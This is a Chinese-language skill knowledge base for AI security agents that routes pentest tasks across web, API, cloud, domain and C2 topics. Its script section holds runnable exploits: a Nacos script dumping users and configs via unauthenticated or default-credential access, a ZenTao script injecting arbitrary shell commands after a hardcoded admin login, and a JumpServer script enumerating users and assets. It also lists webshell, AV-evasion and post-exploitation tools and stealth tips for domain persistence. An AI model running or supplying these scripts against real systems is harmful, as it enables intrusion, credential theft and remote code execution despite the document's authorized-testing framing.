# 网络安全技能集成文档

> 版本：v1.0  
> 更新日期：2026-07-16  
> 来源：E:\BaiduNetdiskDownload\1 目录下的安全技能、脚本和配置文件

---

## 目录

1. [总览](#一总览)
2. [技能分层架构](#二技能分层架构)
3. [核心技能文档](#三核心技能文档)
4. [安全脚本集合](#四安全脚本集合)
5. [工具链矩阵](#五工具链矩阵)
6. [攻击链路协作矩阵](#六攻击链路协作矩阵)
7. [技能选择决策树](#七技能选择决策树)
8. [专家直觉汇总](#八专家直觉汇总)

---

## 一、总览

这是一个面向漏洞赏金、Web 安全、API 安全和授权测试的 Agent Skills 知识库。

### 知识来源与蒸馏边界

本文档基于以下公开知识来源进行教育性蒸馏：

| 来源 | 提供的内容 | 蒸馏方式 |
|---|---|---|
| `swisskyrepo/PayloadsAllTheThings` | 64 个漏洞类别、payload 家族、绕过技术、利用链方向 | 蒸馏为场景化索引、方法矩阵、按引擎/按数据库的 payload 分节 |
| `PentesterSpecialDict` | OS 特化 payload 字典、Java 中间件路径 fuzz 列表、文件扩展名数据库 | 蒸馏为参数命名模式、端点频率表、中间件指纹矩阵 |
| `Dictionary-Of-Pentesting` | BugBounty 绕过技巧（12 专题）、云元数据端点、XXE payload 集合、一行命令工具链 | 蒸馏为绕过模式矩阵、云元数据端点表、WAF 厂商绕过分节 |
| `Hello-CTF` | CTF Web 安全教程，含 PHP/Python/Java 实战技巧 | 蒸馏为 CTF 特定技术段落（handler 绕过、filter chain 技巧、Flask PIN 计算） |
| 公开安全研究论文与 CVE 公告 | 方法论框架、漏洞模式分类法、统计分布 | 蒸馏为攻击模式矩阵、系统化测试清单、决策树 |

### 处理原则

- 不直接搬运超大字典和长 payload 全集
- 优先提炼为可路由、可组合、可审查的安全 skill
- 用小而稳定的样本、分类法和交叉引用来提升 Agent 在真实安全场景中的稳定性
- 不包含任何特定客户信息，不包含可识别的厂商案例细节，纯教育性方法论

---

## 二、技能分层架构

### 分层架构图

```
P0 入口层
  └── hack（总路由器）

P1 分类路由层
  ├── recon-for-sec（侦察与方法论）
  ├── recon-and-methodology（深度侦察）
  ├── api-sec（API安全）
  ├── auth-sec（认证授权）
  ├── injection-checking（注入测试）
  ├── file-access-vuln（文件访问漏洞）
  ├── business-logic-vuln（业务逻辑漏洞）
  ├── mobile-app-sec（移动应用安全）
  ├── cloud-sec（云安全）
  ├── container-sec（容器安全）
  ├── reverse-engineering（逆向工程）
  └── osint（开源情报）

P2 深度专题层（Web/API攻击）
  ├── xss / sqli / ssrf / ssti / xxe
  ├── idor / authbypass / jwt / oauth / saml / cors / csrf
  ├── business-logic / race-condition / prototype-pollution
  ├── cmdi / path-traversal / nosql / type-juggling
  ├── upload / request-smuggling / websocket / csv-injection
  ├── xslt-injection / crlf-injection / expression-language
  ├── jndi-injection / deserialization / open-redirect
  ├── clickjacking / web-cache-deception / dependency-confusion
  ├── insecure-source-code-management / http-parameter-pollution
  └── api-recon / api-auth / api-authorization / graphql

P3 内网与域渗透层
  ├── internal-penetration（内网渗透全流程）
  ├── pivoting-lateral-movement（跳板/横向移动）
  ├── domain-penetration（域渗透全流程）
  └── c2-remote-control（C2远控/持久化）

P4 防御与反制层
  ├── traceback-counterattack（溯源反制）
  └── honeypot-counterattack（蜜罐反制）
```

### 各层功能定位

| 层级 | 功能定位 | 核心职责 |
|---|---|---|
| P0 | 总入口 | 接收任务，识别目标类型，路由到P1分类 |
| P1 | 分类路由 | 按领域细分，识别具体测试方向，路由到P2/P3/P4 |
| P2 | 深度专题 | 具体漏洞类型的测试方法论、payload、验证流程 |
| P3 | 内网域渗透 | 高级攻击技术，包含完整攻击链和持久化 |
| P4 | 防御反制 | 安全事件响应、攻击者溯源、蜜罐部署 |

---

## 三、核心技能文档

### 3.1 hack（总路由器）

这是一个面向 **漏洞赏金、Web 安全、API 安全、授权渗透测试** 的总入口技能。

#### Trust Model

- 本知识库强调内容安全与可审查性
- 使用时应限定在 **授权目标**、**合法研究**、**防御验证**、**漏洞赏金规则允许** 的范围内
- 不要把这里的技巧用于未授权攻击

#### 按观察到的现象路由

| 现象 | 优先方向 |
|---|---|
| 输入反射到 HTML / JS | XSS / SSTI |
| 服务端会主动访问 URL / 主机名 | SSRF |
| 接收 XML / Office / SVG | XXE |
| 路径、文件名、下载接口可控 | Path Traversal / LFI |
| API 中大量对象 ID | IDOR / BOLA / BFLA |
| 登录、找回密码、2FA、Session | Auth Bypass / JWT / OAuth |
| 多步骤交易、优惠券、价格、库存 | Business Logic |
| MongoDB / JSON 查询语法暴露 | NoSQL Injection |
| 命令行工具、图像处理、导入器 | Command Injection |
| HTTP 请求解析异常 / 前后端分帧不一致 | Request Smuggling |
| Node.js JSON 处理 / `__proto__` 可控 | Prototype Pollution |
| PHP 弱比较 / 0e hash / 松散条件 | Type Juggling |
| 同名参数重复 / WAF 与应用解析不一致 | HTTP Parameter Pollution |
| 一次性操作（优惠券/库存/重置） | Race Condition |
| XML/XSLT 模板处理 | XSLT Injection |
| .git/.svn/.env 路径可访问 | Insecure SCM |
| 导出 CSV/Excel 功能 | CSV Formula Injection |
| WebSocket 协议升级 | WebSocket Security |
| 内部包名 / 供应链清单 | Dependency Confusion |
| 域环境 / Active Directory / 域控 | Domain Penetration |
| 内网渗透 / 横向移动 / 跳板攻击 | Internal Penetration / Pivoting |
| C2通信 / Beacon / Session / 远控框架 | C2 Remote Control |
| 安全事件响应 / 攻击者溯源 / 反制 | Traceback Counterattack |
| 蜜罐部署 / 红蓝对抗 / 溯源攻击 | Honeypot Counterattack |

#### 推荐测试顺序

1. Recon / Methodology
2. API Security / Auth / IDOR
3. XSS / SQLi / SSRF / SSTI / XXE
4. Business Logic / Race Condition
5. 组合链与提权路径

---

### 3.2 api-sec（API安全路由器）

这是 API 安全测试的分类入口。先用这个 skill 判断当前 API 更像是文档和资产发现、对象授权、令牌信任问题，还是 GraphQL 与隐藏参数问题，再进入更细的专题 skill。

#### 技能映射

| 技能 | 测试方向 |
|---|---|
| api-recon-and-docs | OpenAPI、Swagger、版本漂移、隐藏文档 |
| api-authorization-and-bola | BOLA、BFLA、方法滥用、隐藏可写字段 |
| api-auth-and-jwt-abuse | Bearer token、Header 信任、Claim 滥用、限流绕过 |
| graphql-and-hidden-parameters | introspection、batching、未公开字段、隐藏参数 |

#### 快速分类

| 观察 | 路由 |
|---|---|
| Swagger 或 OpenAPI 存在 | api-recon-and-docs |
| IDs 出现在 URL、JSON、Header 或 GraphQL args | api-authorization-and-bola |
| JWT token visible in traffic | api-auth-and-jwt-abuse |
| `/graphql` 或 batched JSON arrays 存在 | graphql-and-hidden-parameters |

---

### 3.3 auth-sec（认证授权路由器）

这是认证、会话和授权边界的分类入口。适合先判断问题更偏向登录机制、对象级授权、浏览器信任边界，还是 OAuth、JWT、SAML 这一类身份协议。

#### 技能映射

| 技能 | 测试方向 |
|---|---|
| authbypass-authentication-flaws | 登录绕过、找回密码、2FA、枚举、爆破防护 |
| idor-broken-object-authorization | IDOR、BOLA、BFLA、对象权限缺失 |
| jwt-oauth-token-attacks | 算法混淆、密钥信任、Claim 滥用、Token 伪造 |
| oauth-oidc-misconfiguration | redirect URI、state、nonce、PKCE、账号绑定 |
| csrf-cross-site-request-forgery | CSRF token、SameSite、JSON CSRF、登录 CSRF |
| cors-cross-origin-misconfiguration | 反射 Origin、凭证化跨域读取、Allowlist 绕过 |
| saml-sso-assertion-attacks | assertion wrapping、签名验证、Audience、ACS 边界 |

---

### 3.4 osint（开源情报）

#### 操作规则

- 仅在明确授权的评估范围内使用
- 开始前确认目标、账号、速率限制、测试窗口和禁止操作
- 优先使用最不侵入性的验证方法来证明可利用性或控制失败
- 记录命令、时间戳、请求 ID、受影响的资产和清理操作

#### 工作流程

1. 确认范围、被动收集限制和归属安全的收集方法
2. 收集域名、主机、证书、泄露的元数据、公共代码和暴露的服务
3. 将发现标准化为目标列表、置信度和后续假设
4. 标记高风险暴露，不触及范围外的资产

---

## 四、安全脚本集合

### 4.1 漏洞利用脚本

#### nacos_exploit.py - Nacos漏洞利用

```python
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def nacos_check(url):
    session = requests.Session()
    session.verify = False
    
    targets = [url, f"{url}/nacos"]
    results = []
    
    for target in targets:
        try:
            user_url = f"{target}/nacos/v1/auth/users?pageNo=1&pageSize=100"
            
            resp = session.get(user_url, timeout=10)
            if resp.status_code == 200 and 'content' in resp.text:
                print(f"[+] Nacos未授权访问成功: {target}")
                print(f"[*] 用户列表: {resp.text[:1000]}")
                results.append(('未授权访问', target, resp.text))
                continue
            
            resp_auth = session.get(user_url, auth=('nacos', 'nacos'), timeout=10)
            if resp_auth.status_code == 200 and 'content' in resp_auth.text:
                print(f"[+] Nacos默认凭证登录成功: {target}")
                print(f"[*] 用户列表: {resp_auth.text[:1000]}")
                results.append(('默认凭证', target, resp_auth.text))
            
            headers = {'User-Agent': 'Nacos-Server'}
            resp_ua = session.get(user_url, headers=headers, timeout=10)
            if resp_ua.status_code == 200 and 'content' in resp_ua.text:
                print(f"[+] Nacos User-Agent绕过成功: {target}")
                print(f"[*] 用户列表: {resp_ua.text[:1000]}")
                results.append(('UA绕过', target, resp_ua.text))
            
            config_url = f"{target}/nacos/v1/cs/configs?dataId=&group=&tenant="
            config_resp = session.get(config_url, auth=('nacos', 'nacos'), timeout=10)
            if config_resp.status_code == 200:
                print(f"[+] Nacos配置读取成功: {target}")
                print(f"[*] 配置内容: {config_resp.text[:1000]}")
                results.append(('配置泄露', target, config_resp.text))
            
        except Exception as e:
            print(f"[-] 连接失败: {target} - {e}")
    
    return results

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python nacos_exploit.py <url>")
        print("Example: python nacos_exploit.py http://192.168.80.148:8848")
        sys.exit(1)
    
    url = sys.argv[1].rstrip('/')
    nacos_check(url)
```

#### zen_rce.py - 禅道RCE漏洞利用

```python
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def zentao_rce(url, cmd):
    session = requests.Session()
    session.verify = False
    
    targets = [url, f"{url}/zentao"]
    
    for target in targets:
        try:
            login_url = f"{target}/index.php?m=user&f=login"
            resp = session.get(login_url, timeout=10)
            
            login_data = {
                'account': 'admin',
                'password': '123456',
                'referer': f'{target}/',
                'verifyRand': ''
            }
            
            login_resp = session.post(login_url, data=login_data, timeout=10)
            
            if 'location' in login_resp.headers or 'dashboard' in login_resp.text.lower():
                print(f"[+] ZenTao登录成功: {target}")
                
                rce_url = f"{target}/index.php?m=repo&f=ajaxGetRepoBranch&repoID=1"
                headers = {
                    'X-Requested-With': 'XMLHttpRequest'
                }
                
                payload = f"1';{cmd};'"
                data = {'repoID': payload}
                
                try:
                    rce_resp = session.post(rce_url, headers=headers, data=data, timeout=10)
                    if rce_resp.status_code == 200:
                        print(f"[+] RCE命令执行成功: {cmd}")
                        print(f"[*] 响应: {rce_resp.text[:500]}")
                        return True
                except Exception as e:
                    print(f"[-] RCE尝试失败: {e}")
                
                rce_url2 = f"{target}/index.php?m=client&f=create"
                for repo_id in range(1, 10):
                    try:
                        data2 = {
                            'name': 'test',
                            'url': f"http://127.0.0.1/';{cmd};'",
                            'repoID': str(repo_id)
                        }
                        rce_resp2 = session.post(rce_url2, data=data2, timeout=10)
                        if rce_resp2.status_code == 200:
                            print(f"[+] RCE命令执行成功(方法2): {cmd}")
                            return True
                    except:
                        continue
            else:
                print(f"[-] ZenTao登录失败: {target}")
        except Exception as e:
            print(f"[-] 连接失败: {target} - {e}")
    
    return False

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python zen_rce.py <url> <command>")
        print("Example: python zen_rce.py http://192.168.80.148 id")
        sys.exit(1)
    
    url = sys.argv[1].rstrip('/')
    cmd = sys.argv[2]
    
    zentao_rce(url, cmd)
```

#### jumpserver_pwn.py - Jumpserver登录利用

```python
import requests
import sys
import json
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def jumpserver_login(url, username, password):
    session = requests.Session()
    session.verify = False
    
    targets = [url, f"{url}/jumpserver"]
    
    for target in targets:
        try:
            login_url = f"{target}/api/v1/authentication/auth/"
            data = {
                'username': username,
                'password': password
            }
            
            resp = session.post(login_url, json=data, timeout=10)
            
            if resp.status_code == 200:
                result = resp.json()
                if 'token' in result:
                    token = result['token']
                    print(f"[+] Jumpserver登录成功: {target}")
                    print(f"[*] Token: {token[:50]}...")
                    
                    session.headers['Authorization'] = f"Bearer {token}"
                    
                    user_info = session.get(f"{target}/api/v1/users/users/", timeout=10)
                    if user_info.status_code == 200:
                        users = user_info.json()
                        print(f"[+] 获取用户列表成功")
                        for user in users.get('results', [])[:5]:
                            print(f"    - {user.get('username')} ({user.get('role')})")
                    
                    asset_info = session.get(f"{target}/api/v1/assets/assets/", timeout=10)
                    if asset_info.status_code == 200:
                        assets = asset_info.json()
                        print(f"[+] 获取资产列表成功")
                        for asset in assets.get('results', [])[:5]:
                            print(f"    - {asset.get('hostname')} ({asset.get('ip')})")
                    
                    return True
                else:
                    print(f"[-] Jumpserver登录失败: {result.get('detail', '未知错误')}")
            else:
                print(f"[-] Jumpserver登录请求失败: {resp.status_code}")
        except Exception as e:
            print(f"[-] 连接失败: {target} - {e}")
    
    return False

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python jumpserver_pwn.py <url> <username> <password>")
        print("Example: python jumpserver_pwn.py http://192.168.80.148:8080 admin password123")
        sys.exit(1)
    
    url = sys.argv[1].rstrip('/')
    username = sys.argv[2]
    password = sys.argv[3]
    
    jumpserver_login(url, username, password)
```

### 4.2 扫描与枚举脚本

#### docker_enum.py - Docker容器枚举

```python
import subprocess
import sys
import os

def docker_enum(target_ip=None):
    print("[*] Docker容器枚举")
    
    commands = [
        "docker ps -a",
        "docker images",
        "docker info",
        "ls -la /var/run/docker.sock",
        "cat /etc/docker/daemon.json 2>/dev/null || echo 'No daemon.json'",
        "docker network ls",
        "docker volume ls"
    ]
    
    if target_ip:
        print(f"[*] 目标主机: {target_ip}")
        print("[*] 请在目标主机上执行以下命令:")
        for cmd in commands:
            print(f"    {cmd}")
        return
    
    print("[*] 本地Docker信息收集:")
    for cmd in commands:
        print(f"\n[+] 执行: {cmd}")
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            if result.stdout:
                print(result.stdout.strip())
            if result.stderr:
                print(f"stderr: {result.stderr.strip()}")
        except subprocess.TimeoutExpired:
            print("[-] 命令超时")
        except Exception as e:
            print(f"[-] 执行失败: {e}")
    
    print("\n[*] Docker逃逸检测:")
    escape_checks = [
        ("Docker Socket权限", "/var/run/docker.sock"),
        ("Docker组权限", "/etc/group"),
        ("SUID容器工具", "/usr/bin/docker"),
        ("Mount命名空间", "/proc/self/mounts")
    ]
    
    for check_name, path in escape_checks:
        print(f"\n[+] 检查: {check_name}")
        if os.path.exists(path):
            try:
                stat_info = os.stat(path)
                print(f"    [*] 路径存在: {path}")
                print(f"    [*] 权限: {oct(stat_info.st_mode)[-4:]}")
                if path == "/var/run/docker.sock":
                    print("    [!] Docker Socket可被利用进行容器逃逸")
            except Exception as e:
                print(f"    [-] 获取信息失败: {e}")
        else:
            print(f"    [-] 路径不存在: {path}")

if __name__ == "__main__":
    if len(sys.argv) == 2:
        docker_enum(sys.argv[1])
    else:
        docker_enum()
```

#### auto_risk_judge.py - 自动风险研判

```python
# -*- coding: utf-8 -*-
"""合并指纹与凭证占位结果，本地生成优先级研判 JSON（无网络）。"""
import json
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
CONFIG_PATH = ROOT / "config.json"

with open(CONFIG_PATH, "r", encoding="utf-8") as f:
    cfg = json.load(f)

SRC = cfg.get("virtual_source", "local_virtual_no_network")
finger_file = ROOT / Path(cfg["scan_result_dir"]) / "ehole_fingerprint_sim.json"
weak_file = ROOT / Path(cfg["scan_result_dir"]) / "weakpass_sim.json"
out_path = ROOT / Path(cfg["scan_result_dir"]) / "risk_judge_sim.json"

with open(finger_file, "r", encoding="utf-8") as f:
    finger = json.load(f)
with open(weak_file, "r", encoding="utf-8") as f:
    weak = json.load(f)

if len(finger) != len(weak):
    raise ValueError("指纹与凭证占位条数不一致，请重新运行前两步脚本")

rules = cfg.get("priority_rules", {})
judge_results = []

for f_item, w_item in zip(finger, weak):
    host = f_item.get("host") or f_item.get("ip", "")
    port = f_item["port"]
    service_type = f_item.get("service_type") or f_item.get("cms", "T00")
    priority = f_item.get("priority_hint", "P3")
    flagged = w_item.get("flagged", w_item.get("sim_suspected", False))
    note = rules.get(priority, "占位说明")
    if flagged:
        note = f"{note} / 教学标记"

    judge_results.append(
        {
            "host": host,
            "port": port,
            "service_type": service_type,
            "priority": priority,
            "risk_note": f"本地模拟：{note}",
            "flagged": flagged,
            "_simulation": True,
            "_source": SRC,
        }
    )

out_path.parent.mkdir(parents=True, exist_ok=True)
with open(out_path, "w", encoding="utf-8") as f:
    json.dump(judge_results, f, ensure_ascii=False, indent=2)

print(f"[OK] 自动优先级研判完成，输出：{out_path}")
```

#### virtual_ehole_scan.py - 虚拟指纹扫描

```python
# -*- coding: utf-8 -*-
"""纯本地模拟指纹输出，不发起任何网络请求。"""
import json
from pathlib import Path
from typing import Tuple
from urllib.parse import urlparse

ROOT = Path(__file__).resolve().parent.parent
CONFIG_PATH = ROOT / "config.json"

with open(CONFIG_PATH, "r", encoding="utf-8") as f:
    cfg = json.load(f)

SRC = cfg.get("virtual_source", "local_virtual_no_network")
target_path = ROOT / Path(cfg["target_file"])
out_path = ROOT / Path(cfg["scan_result_dir"]) / "ehole_fingerprint_sim.json"

HOST_PROFILE: dict[str, tuple[str, str]] = {
    "127.0.0.1": ("T01", "P2"),
    "10.0.0.1": ("T02", "P0"),
    "10.0.0.2": ("T03", "P1"),
    "10.0.0.3": ("T04", "P2"),
    "10.0.0.4": ("T05", "P3"),
}

PORT_DEFAULT: dict[int, tuple[str, str]] = {
    80: ("T04", "P2"),
    443: ("T04", "P2"),
    8080: ("T03", "P1"),
    8765: ("T01", "P2"),
    22: ("T02", "P0"),
    8000: ("T03", "P1"),
}

META_BY_TYPE: dict[str, Tuple[str, int, int, str]] = {
    "T01": ("http-demo/1.0", 200, 512, "demo-page"),
    "T02": ("mgmt-demo/1.0", 200, 1024, ""),
    "T03": ("app-demo/1.0", 200, 2048, ""),
    "T04": ("static-demo/1.0", 200, 1536, ""),
    "T05": ("svc-demo/1.0", 200, 768, ""),
    "T00": ("unknown-demo/1.0", 200, 555, ""),
}


def _resolve_profile(host: str, port: int) -> tuple[str, str]:
    if host in HOST_PROFILE:
        return HOST_PROFILE[host]
    return PORT_DEFAULT.get(port, ("T00", "P3"))


results = []
with open(target_path, "r", encoding="utf-8") as f:
    urls = [u.strip() for u in f.readlines() if u.strip() and not u.strip().startswith("#")]

for url in urls:
    parsed = urlparse(url)
    host = parsed.hostname or ""
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    service_type, priority = _resolve_profile(host, port)
    server, statuscode, length, title = META_BY_TYPE.get(service_type, META_BY_TYPE["T00"])
    results.append(
        {
            "url": url,
            "host": host,
            "port": port,
            "service_type": service_type,
            "priority_hint": priority,
            "server": server,
            "statuscode": statuscode,
            "length": length,
            "title": title,
            "_simulation": True,
            "_source": SRC,
        }
    )

out_path.parent.mkdir(parents=True, exist_ok=True)
with open(out_path, "w", encoding="utf-8") as f:
    json.dump(results, f, ensure_ascii=False, indent=2)

print(f"[OK] 虚拟指纹扫描完成，输出：{out_path}")
```

---

## 五、工具链矩阵

### 5.1 各领域工具链

| 领域 | 核心工具 | 辅助工具 |
|---|---|---|
| OSINT | subfinder, amass, dnsx, shodan, fofa, zoomeye | maltego, sherlock, trufflehog, gau, waybackurls |
| Web安全 | Burp Suite, sqlmap, nmap, nuclei | nikto, dirb, feroxbuster, zap |
| API安全 | Burp Suite, Postman, GraphQL Voyager | arjun, graphql-scanner, jwt_tool |
| 移动安全 | Frida, apktool, jadx, Charles, MobSF | Xposed, Substrate, QARK, SSL Kill Switch |
| 云安全 | AWS CLI, Azure CLI, Prowler, Scout Suite, Checkov | s3scanner, cloud_enum, CloudMapper |
| 容器安全 | Trivy, Snyk, Docker Bench Security, kube-bench, kube-hunter | Clair, Falco, grype, syft |
| 逆向工程 | IDA Pro, Ghidra, GDB, WinDbg, LLDB | binwalk, radare2, QEMU, AFL++, libFuzzer |
| 内网渗透 | CrackMapExec, Impacket, BloodHound, SharpHound | evil-winrm, rdp_check, smbmap |
| C2通信 | Metasploit, Cobalt Strike, Empire, Covenant | frp, nps, reGeorg, Neo-reGeorg |
| 溯源反制 | Volatility, Sysmon, ELK, MITRE ATT&CK | Autopsy, FTK Imager, Sigma Rules |

### 5.2 工具与Skill对应关系

| Skill | 推荐工具 |
|---|---|
| osint | subfinder, amass, dnsx, shodan, fofa, zoomeye, maltego |
| recon-for-sec | nmap, nuclei, feroxbuster, gau, waybackurls |
| api-sec | Burp Suite, Postman, arjun, graphql-scanner |
| auth-sec | Burp Suite, jwt_tool, oauth_tool |
| injection-checking | Burp Suite, sqlmap, nuclei, xsstrike |
| mobile-app-sec | Frida, apktool, jadx, Charles, MobSF |
| cloud-sec | Prowler, Scout Suite, Checkov, s3scanner |
| container-sec | Trivy, Snyk, kube-bench, kube-hunter, Falco |
| reverse-engineering | IDA Pro, Ghidra, GDB, binwalk, AFL++ |
| internal-penetration | CrackMapExec, Impacket, BloodHound |
| pivoting-lateral-movement | CrackMapExec, evil-winrm, smbmap |
| domain-penetration | Impacket, BloodHound, CrackMapExec |
| c2-remote-control | Metasploit, Cobalt Strike, frp, reGeorg |
| traceback-counterattack | Volatility, Sysmon, ELK |
| honeypot-counterattack | HFish, T-Pot, HoneyPy |

### 5.3 工具分类目录

```
工具分类：
├── WebShell管理工具
│   ├── Alien
│   ├── 中国蚁剑
│   ├── 冰蝎3/4
│   ├── 哥斯拉
│   └── 天蝎
├── 信息收集工具
│   ├── Ehole指纹识别
│   ├── TideFinger
│   ├── P1finger
│   ├── DirSearch
│   ├── OneForALL
│   └── httpx
├── 抓包与代理工具
│   ├── Burp Suite
│   ├── Fiddler
│   ├── Yakit
│   ├── Proxifier
│   ├── Clash
│   └── V2Ray
├── 漏洞扫描与利用工具
│   ├── XRAY
│   ├── fscan
│   ├── sqlmap
│   ├── nuclei
│   ├── afrog
│   ├── Kscan
│   └── Goby
├── 框架漏洞利用工具
│   ├── Fastjson检测
│   ├── Shiro_Attack
│   ├── SpringBoot-Scan
│   ├── Thinkphp漏洞利用
│   ├── WeblogicTool
│   ├── Struts2漏洞检测
│   └── JBoss漏洞检测
├── 爆破工具
│   ├── Gorailgun
│   └── Week-Passwd
├── 免杀工具
│   ├── AniYa-GUl
│   ├── 掩日红队
│   ├── Webshell生成器
│   └── HeavenlyBypassAV
├── 后渗透工具
│   ├── CobaltStrike
│   ├── Mimikatz
│   ├── Ladon_GUI
│   └── Quasar
└── 网页工具
    ├── FOFA
    ├── Hunter
    ├── Quake
    ├── Zoomeye
    ├── Shodan
    ├── DNSLOG平台
    └── 威胁情报平台
```

---

## 六、攻击链路协作矩阵

### 6.1 攻击阶段协作

| 攻击阶段 | 主Skill | 提供能力 | 衔接Skill | 衔接用途 |
|---|---|---|---|---|
| 初始突破 | recon-and-methodology | 资产发现/指纹识别 | internal-penetration | 外网突破入口 |
| OSINT情报收集 | osint | 域名分析/IP情报/资产测绘 | recon-for-sec | 侦察情报补充 |
| 移动应用分析 | mobile-app-sec | APK反编译/API加密分析 | api-sec | 移动端API测试 |
| 云环境分析 | cloud-sec | 云元数据/S3存储/IAM配置 | injection-checking | SSRF云元数据利用 |
| 容器环境分析 | container-sec | Docker/K8s安全/镜像漏洞 | reverse-engineering | 容器逃逸漏洞挖掘 |
| 逆向工程分析 | reverse-engineering | 二进制/固件/加密算法分析 | injection-checking | 漏洞利用开发 |
| C2建立 | c2-remote-control | 上线/通信协议/规避 | internal-penetration | 内网隧道选择 |
| 内网渗透 | internal-penetration | 完整渗透流程/代理隧道 | pivoting-lateral-movement | 横向移动技术 |
| 横向移动 | pivoting-lateral-movement | PsExec/Impacket/DCOM | domain-penetration | 域内横向 |
| 域控突破 | domain-penetration | Kerberoasting/委派/漏洞利用 | internal-penetration | 凭据导出 |
| 持久化维持 | c2-remote-control | 黄金票据/Skeleton Key/持久化 | domain-penetration | 域控持久化 |
| 溯源反制 | traceback-counterattack | 日志分析/内存取证/溯源 | honeypot-counterattack | 蜜罐联动溯源 |
| 蜜罐反制 | honeypot-counterattack | 蜜罐部署/诱饵投放/反制 | traceback-counterattack | 攻击者画像 |

### 6.2 典型场景Skill组合

**场景1：红队评估全流程**
```
recon-and-methodology → internal-penetration → c2-remote-control
→ pivoting-lateral-movement → domain-penetration → c2-remote-control（持久化）
```

**场景2：域渗透专项**
```
domain-penetration → pivoting-lateral-movement（BloodHound分析）
→ domain-penetration（Kerberoasting/委派/漏洞利用）
→ internal-penetration（凭据导出）→ c2-remote-control（权限维持）
```

**场景3：蓝队溯源反制**
```
traceback-counterattack（日志分析/内存取证）
→ traceback-counterattack（MITRE ATT&CK映射/时间线重建）
→ honeypot-counterattack（蜜罐部署/诱饵投放）
→ traceback-counterattack（攻击者身份溯源）
```

**场景4：内网不出网场景**
```
internal-penetration（外网突破）→ c2-remote-control（SMB Beacon/隧道选择）
→ pivoting-lateral-movement（横向移动）→ internal-penetration（代理隧道）
→ domain-penetration（域控突破）
```

**场景5：HW红蓝对抗**
```
honeypot-counterattack（蜜罐部署/诱饵投放）
→ traceback-counterattack（监控告警/攻击者上线分析）
→ honeypot-counterattack（溯源反制/身份定位）
→ traceback-counterattack（完整溯源报告）
```

**场景6：移动应用安全测试**
```
mobile-app-sec → api-sec → auth-sec → reverse-engineering
```

**场景7：云安全评估**
```
osint → cloud-sec → injection-checking → auth-sec
```

---

## 七、技能选择决策树

```
目标类型识别
├── Web应用
│   ├── API端点暴露 → api-sec
│   ├── 认证机制存在 → auth-sec
│   ├── 输入可控 → injection-checking
│   └── 文件操作 → file-access-vuln
│
├── 移动应用（APK/IPA）
│   └── mobile-app-sec
│       ├── 证书固定 → certificate-pinning-bypass
│       ├── API加密 → mobile-api-security
│       ├── 代码分析 → android-reverse-engineering/ios-reverse-engineering
│       └── 数据存储 → mobile-data-storage
│
├── 云环境（AWS/Azure/GCP）
│   └── cloud-sec
│       ├── 元数据端点 → cloud-metadata-exposure
│       ├── 存储桶 → cloud-storage-security
│       ├── IAM配置 → cloud-iam-security
│       └── Serverless → serverless-security
│
├── 容器环境（Docker/K8s）
│   └── container-sec
│       ├── 镜像安全 → container-image-security
│       ├── 容器逃逸 → container-escape
│       ├── RBAC配置 → kubernetes-rbac
│       └── 供应链 → container-supply-chain
│
├── 二进制/固件
│   └── reverse-engineering
│       ├── 二进制分析 → binary-analysis
│       ├── 固件逆向 → firmware-reverse-engineering
│       ├── 加密分析 → cryptography-analysis
│       └── 漏洞研究 → vulnerability-research
│
├── 域环境（Active Directory）
│   └── domain-penetration → pivoting-lateral-movement
│
├── 内网环境
│   └── internal-penetration → pivoting-lateral-movement
│
└── 情报收集
    └── osint
        ├── 域名分析 → domain-osint
        ├── IP情报 → ip-osint
        ├── 资产测绘 → infrastructure-osint
        └── 威胁情报 → threat-intelligence-osint
```

---

## 八、专家直觉汇总

1. **同一套过滤逻辑往往复用在多个页面**：一个点可绕过，类似页面通常也能绕过
2. **参数名本身也是攻击面**：WAF 经常只盯参数值，不盯参数名
3. **二阶漏洞非常常见**：存储时安全，不代表读取后进入危险上下文时也安全
4. **BOLA 的本质是"有认证、无授权"**：A/B 账号切换重放非常关键
5. **老版本接口最容易漏补丁**：v2 修了不代表 v1 下线了
6. **业务逻辑漏洞往往回报最高**：它们难以被扫描器发现，也更容易长期存在
7. **Race Condition 应优先测试"一次性"操作**：优惠券、领取、重置、邀请、试用、库存扣减
8. **JWT 攻击先看密钥与算法上下文**：不要盲目试 payload，要先确认 `alg`、`kid`、JWKS、密钥来源
9. **域渗透先做BloodHound拓扑分析**：不要盲目尝试漏洞，先用BloodHound找到最优攻击路径再动手
10. **内网渗透优先凭据复用**：利用现有凭据横向移动比漏洞利用更隐蔽、成功率更高
11. **C2通信协议按出网条件选择**：能出网用HTTPS，仅DNS出网用DNS隧道，不出网用SMB Beacon
12. **Kerberoasting优先于漏洞利用**：不需要域控权限，仅凭普通域用户即可获取服务账户密码
13. **委派攻击是最隐蔽的域管路径**：RBCD只需修改机器属性，不触发域控日志告警
14. **溯源反制先固定证据再操作**：获取磁盘镜像和内存转储后再进行反制，避免证据丢失
15. **蜜罐要高仿真**：使用真实漏洞环境而非云蜜罐，避免被攻击者快速识别
16. **移动应用先过证书固定**：Frida脚本是最有效的SSL/TLS抓包绕过方法
17. **云安全先查元数据端点**：AWS IMDSv1无需认证即可获取临时凭证
18. **容器安全先扫镜像漏洞**：Trivy/Snyk能快速发现基础镜像中的已知漏洞
19. **逆向工程先用静态分析**：字符串分析和函数调用图能快速定位敏感逻辑
20. **OSINT先做资产测绘**：FoFa/Zoomeye能快速发现目标的全部在线资产

---

## 九、完整技能索引

### 侦察与方法论

| 技能 | 核心内容 |
|---|---|
| hack | 总路由器、现象到技能的映射、专家直觉 |
| recon-for-sec | 侦察阶段分类路由 |
| recon-and-methodology | 方法论框架、Java 中间件指纹矩阵、泄露检测清单 |

### API 安全

| 技能 | 核心内容 |
|---|---|
| api-sec | API 测试分类路由 |
| api-recon-and-docs | API 发现、OpenAPI/Swagger、隐藏端点 |
| api-authorization-and-bola | BOLA/BFLA、批量赋值、对象级授权 |
| api-auth-and-jwt-abuse | JWT 攻击、API 密钥滥用、令牌操控 |
